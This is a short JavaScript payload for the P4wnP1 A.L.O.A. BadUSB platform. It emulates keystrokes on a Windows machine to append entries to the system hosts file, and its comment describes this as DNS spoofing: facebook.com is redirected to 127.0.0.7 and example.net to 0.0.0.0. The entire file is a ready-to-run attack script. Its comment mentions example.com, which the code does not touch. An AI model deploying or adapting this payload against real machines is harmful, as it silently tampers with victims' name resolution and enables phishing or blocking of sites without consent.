// WIN-C03--Payload-ManipulateHosts.js
// Version: 2023-06-08--001


// Set keyboard layout to German (DE)
layout('DE');
typingSpeed(0,0);


// Clear screen
type("cls");
press("RETURN");


// DNS spoofing: set fake IP addresses for example.net and example.com in Hosts
type("echo.>> C:/Windows/System32/drivers/etc/hosts");
press("RETURN");
type("echo ### set by P4wnP1 A.L.O.A.>> C:/Windows/System32/drivers/etc/hosts\n");
press("RETURN");

type("echo 127.0.0.7           facebook.com www.facebook.com>> C:/Windows/System32/drivers/etc/hosts\n");
type("echo 0.0.0.0             example.net www.example.net>> C:/Windows/System32/drivers/etc/hosts\n");
press("RETURN");
